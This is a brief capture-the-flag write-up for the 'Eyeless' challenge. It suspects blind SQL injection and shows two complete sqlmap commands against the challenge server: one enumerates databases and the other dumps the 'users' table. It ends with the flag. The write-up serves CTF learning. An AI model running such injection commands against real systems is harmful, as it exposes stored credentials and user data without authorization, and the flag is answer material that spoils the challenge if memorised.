# Eyeless

The name suggests that there must be Blind SQL injection somewhere.  
So I have used sqlmap to get databases,
> `python sqlmap.py -u http://jh2i.com:50011/ --data "username=admin&password=test" -p username --method POST --dbs`
and found the database named **eyeless** 

Then I ran,
> `python sqlmap.py -u http://jh2i.com:50011/ --data "username=admin&password=test" -p username --method POST --dump -D eyeless -T users` 

And got the flag!

> ### LLS{blind_sql_injection_cant_be_done_with_braille}